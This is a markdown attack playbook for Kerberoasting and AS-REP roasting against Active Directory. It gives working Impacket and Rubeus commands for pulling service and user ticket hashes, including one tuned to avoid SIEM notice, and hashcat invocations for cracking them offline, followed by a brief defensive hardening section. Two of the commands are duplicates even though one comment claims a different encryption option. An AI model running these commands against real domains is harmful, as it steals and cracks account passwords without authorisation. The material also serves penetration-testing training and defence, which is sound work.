# 🎯 Kerberoasting & AS-REP Roasting Playbook

Kerberos ticket extraction attacks exploit the fundamental design of the Kerberos protocol to request service or authentication tickets encrypted with user password hashes, which can then be cracked offline without interacting with target endpoints.

---

### Protocol Mechanics: How Kerberos Authentication Works

```text
User / Client                      KDC / Domain Controller                 Target Service
   |                                        |                                     |
   | --- 1. AS-REQ (User Timestamp) ------> |                                     |
   | <--- 2. AS-REP (TGT + Session Key) --- |                                     |
   |                                        |                                     |
   | --- 3. TGS-REQ (TGT + Requested SPN) -> |                                    |
   | <--- 4. TGS-REP (TGS Ticket Encrypted  |                                     |
   |         with Service Account Hash) --- |                                     |
   |                                                                              |
   | ------------------- 5. AP-REQ (TGS Ticket) --------------------------------> |
   | <------------------ 6. AP-REP (Mutual Authentication) ---------------------- |
```

---

### Attack Vector 1: Kerberoasting

#### Theoretical Vulnerability
Any authenticated domain user can request a **Ticket Granting Service (TGS)** ticket for any service registered with a **Service Principal Name (SPN)**. 

Because the Domain Controller does not verify whether the requesting user actually has authorization to access the service, it issues the ticket encrypted with the **NTLM hash** of the service account. The attacker extracts this ciphertext and cracks it offline using dictionary attacks.

#### 1. Enumerating & Extracting SPNs with Impacket

```bash
# Query all accounts with registered SPNs and request TGS tickets
GetUserSPNs.py CORP.LOCAL/jdoe:'Welcome2025!' -dc-ip 192.168.56.10 -request -outputfile hashes.kerberoast

# Request tickets with specific encryption format (RC4 is significantly faster to crack than AES)
GetUserSPNs.py CORP.LOCAL/jdoe:'Welcome2025!' -dc-ip 192.168.56.10 -request -outputfile hashes.kerberoast
```

#### 2. Windows-Native Extraction with Rubeus

```powershell
# Kerberoast all users and output hash format directly for Hashcat
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Kerberoast specific user to reduce SIEM anomaly footprint
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

#### 3. Offline Cracking with Hashcat

```bash
# Hashcat Mode 13100: Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O

# Hashcat Mode 19600 / 19700: Kerberos 5 TGS-REP etype 17/18 (AES-128 / AES-256)
hashcat -m 19700 -a 0 hashes_aes.kerberoast /usr/share/wordlists/rockyou.txt
```

---

### Attack Vector 2: AS-REP Roasting

#### Theoretical Vulnerability
When a user account has the Active Directory attribute `DONT_REQ_PREAUTH` (Do not require Kerberos preauthentication) enabled, an attacker can send an **AS-REQ** without knowing the user's password. 

The KDC immediately returns an **AS-REP** packet containing a portion encrypted with the user's password hash. This can be executed with **no prior credentials required** if the username list is known.

#### 1. Remote AS-REP Extraction with Impacket

```bash
# Extract AS-REP hashes for all users with pre-authentication disabled
GetNPUsers.py CORP.LOCAL/ -usersfile domain_users.txt -dc-ip 192.168.56.10 -format hashcat -outputfile hashes.asrep

# Authenticated sweep across entire domain
GetNPUsers.py CORP.LOCAL/jdoe:'Welcome2025!' -dc-ip 192.168.56.10 -request -format hashcat -outputfile hashes.asrep
```

#### 2. Offline Cracking with Hashcat

```bash
# Hashcat Mode 18200: Kerberos 5 AS-REP etype 23 (RC4-HMAC)
hashcat -m 18200 -a 0 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule -O
```

---

### Blue Team Defense & Remediation

> [!IMPORTANT]
> **Defensive Hardening Directives:**
> 1. **Group Managed Service Accounts (gMSA)**: Transition all application service accounts to gMSA. Windows manages password rotation automatically with complex 128-character passwords, rendering offline cracking computationally infeasible.
> 2. **Password Length**: If service accounts must use static passwords, enforce a minimum length of 25+ randomly generated characters.
> 3. **Disable RC4**: Enforce AES-128 and AES-256 for Kerberos encryption across the domain via Group Policy:
>    `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options -> Network security: Configure encryption types allowed for Kerberos`.
> 4. **SIEM Detection**: Alert on **Event ID 4769** when `Ticket Encryption Type` is `0x17` (RC4-HMAC) and multiple service tickets are requested within a narrow time window.
